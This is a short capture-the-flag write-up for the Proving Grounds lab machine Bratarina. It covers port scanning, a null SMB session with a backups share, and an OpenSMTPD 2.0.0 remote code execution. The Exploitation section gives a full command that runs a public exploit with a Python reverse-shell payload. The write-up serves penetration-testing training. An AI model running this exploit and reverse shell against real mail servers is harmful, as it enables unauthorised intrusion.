---
description: Writeup for Bratarina from Offensive Security Proving Grounds (PG)
---

# Bratarina

## Service Enumeration

`nmapAutomator.sh -H 192.168.163.71 -t full`

`nmapAutomator.sh -H 192.168.163.71 -t vulns`

![](../../.gitbook/assets/3cf7def76b2a43b2ba4161a0a9b1a9de.png)

### Samba

Null SMB sessions are allowed.

![](../../.gitbook/assets/52b44efb6d7449f7b618e801ca88cf5d.png)

There is a `backups` share.

![](../../.gitbook/assets/e8c07a66a4984db292075c3ccb201958.png)

### SMTP

OpenSMTP 2.0.0 is used.

![](../../.gitbook/assets/d897f209a0024f579216e21871dd0cd8.png)

## Exploitation

This is vulnerable to an RCE vulnerability: [https://www.exploit-db.com/exploits/47984](https://www.exploit-db.com/exploits/47984)

`python3 47984.py 192.168.163.71 25 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.49.163\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"'`

We receive a reverse shell:

![](../../.gitbook/assets/dcc7279e5ed746efb80b22e3606c63c4.png)

Proof:

![](../../.gitbook/assets/9bb24000317d471eb04ad046f27db0f0.png)

